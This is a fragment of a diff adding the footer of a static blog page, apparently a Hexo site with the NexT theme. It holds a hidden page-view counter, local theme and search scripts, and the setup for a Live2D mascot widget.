+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":250,"height":250},"mobile":{"show":true}});</script></body>
+</html>
